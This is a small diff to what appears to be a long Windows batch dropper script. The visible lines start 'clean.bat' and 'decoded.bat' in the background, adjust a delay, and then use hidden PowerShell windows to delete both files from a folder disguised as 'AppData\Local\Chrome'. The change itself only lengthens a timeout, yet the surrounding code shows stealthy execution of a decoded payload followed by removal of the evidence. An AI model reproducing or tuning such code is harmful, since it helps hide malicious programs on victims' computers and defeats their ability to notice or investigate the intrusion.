@@ -3293,7 +3293,7 @@ if '%errorlevel%' NEQ '0' (
 timeout /t 10 >nul
 start "" /b clean.bat
 start "" /b decoded.bat
-timeout /t 15 >nul
+timeout /t 25 >nul
 
 powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat' -Force}"
 powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat' -Force}"
@@ -3301,7 +3301,6 @@ powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppDa
 exit
 endlocal
 :----------------------------------------------------------------------------------------------------------------:
-
 
 
 
